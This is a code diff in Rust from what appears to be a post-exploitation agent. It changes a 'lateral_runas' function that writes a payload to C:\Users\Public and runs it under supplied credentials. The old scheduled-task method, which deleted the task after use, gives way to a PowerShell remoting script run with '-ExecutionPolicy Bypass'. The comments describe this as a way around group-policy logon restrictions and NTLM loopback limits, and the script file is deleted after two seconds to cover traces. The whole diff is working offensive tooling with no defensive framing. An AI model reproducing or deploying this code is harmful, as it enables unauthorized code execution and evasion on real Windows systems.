@@ -315,12 +315,9 @@ mod inner {
 
     pub fn lateral_runas(data: &[u8], cmd_path: &str, user: &str, pass: &str) -> Result<String, String> {
         let svc_name = rand_svc_name();
-        let ru = user
-            .trim_start_matches(".\\")
-            .trim_start_matches("./");
 
-        // When we have payload bytes, write them to disk first — otherwise the
-        // schtask /TR is empty and the process never spawns.
+        // Write payload bytes to disk when provided, unless the destination
+        // is the same file the agent is currently running from (os error 32).
         let drop_path: String;
         let effective_path: &str = if !data.is_empty() {
             let fname = std::path::Path::new(cmd_path)
@@ -328,46 +325,64 @@ mod inner {
                 .map(|f| f.to_string_lossy().into_owned())
                 .unwrap_or_else(|| format!("{}.exe", svc_name));
             drop_path = format!("C:\\Users\\Public\\{}", fname);
-            fs::write(&drop_path, data)
-                .map_err(|e| format!("write payload failed: {}", e))?;
+            if drop_path.to_lowercase() != cmd_path.to_lowercase() {
+                fs::write(&drop_path, data)
+                    .map_err(|e| format!("write payload failed: {}", e))?;
+            }
             &drop_path
         } else {
             cmd_path
         };
 
-        let out1 = Command::new("schtasks")
+        // PSRemoting (WinRM, logon type 3) bypasses both the interactive-logon
+        // GPO restriction and NTLM loopback limits. Start-Process inside the
+        // remote scriptblock creates the process without blocking: PowerShell
+        // is launched with .spawn() so the agent thread returns immediately.
+        runas_psremoting_spawn(effective_path, user, pass)
+    }
+
+    fn runas_psremoting_spawn(exe_path: &str, user: &str, pass: &str) -> Result<String, String> {
+        use std::time::{SystemTime, UNIX_EPOCH};
+        let t = SystemTime::now()
+            .duration_since(UNIX_EPOCH)
+            .unwrap_or_default()
+            .subsec_nanos();
+        let tmp = format!("C:\\Users\\Public\\run_{:08x}.ps1", t);
+
+        let safe_pass = pass.replace('\'', "''");
+        let safe_user = user.replace('\'', "''");
+        let safe_exe  = exe_path.replace('\'', "''");
+
+        let script = format!(
+            "$pw = ConvertTo-SecureString '{}' -AsPlainText -Force\r\n\
+             $cred = New-Object PSCredential('{}', $pw)\r\n\
+             Invoke-Command -ComputerName '127.0.0.1' -Credential $cred \
+             -ScriptBlock {{ Start-Process '{}' }}\r\n",
+            safe_pass, safe_user, safe_exe
+        );
+
+        fs::write(&tmp, script.as_bytes())
+            .map_err(|e| format!("runas_psremoting: write ps1 failed: {}", e))?;
+
+        // .spawn() — PowerShell runs in background, agent is NOT blocked.
+        // The ps1 is read by PowerShell within ~1s of launch, so a short
+        // sleep before cleanup is sufficient.
+        let _child = Command::new("powershell.exe")
             .args([
-                "/create",
-                "/RU",
-                ru,
-                "/RP",
-                pass,
-                "/TR",
-                effective_path,
-                "/TN",
-                &svc_name,
-                "/SC",
-                "ONCE",
-                "/ST",
-                "00:00",
-                "/F",
+                "-NonInteractive",
+                "-NoProfile",
+                "-ExecutionPolicy", "Bypass",
+                "-File", &tmp,
             ])
-            .output()
-            .map(|o| String::from_utf8_lossy(&o.stdout).to_string())
-            .unwrap_or_default();
-        let _ = Command::new("schtasks")
-            .args(["/run", "/TN", &svc_name])
-            .output();
-        std::thread::sleep(std::time::Duration::from_secs(4));
-        let _ = Command::new("schtasks")
-            .args(["/delete", "/TN", &svc_name, "/F"])
-            .output();
+            .spawn()
+            .map_err(|e| format!("runas_psremoting: spawn failed: {}", e))?;
+
+        std::thread::sleep(std::time::Duration::from_secs(2));
+        let _ = fs::remove_file(&tmp);
+
         Ok(format!(
-            "[+] runas → {} @ local\n    path: {}\n    task: {} (deleted)\n{}",
-            ru,
-            effective_path,
-            svc_name,
-            out1.trim()
+            "[+] runas → {} (PSRemoting)\n    path: {}\n",
+            user, exe_path
         ))
     }
 
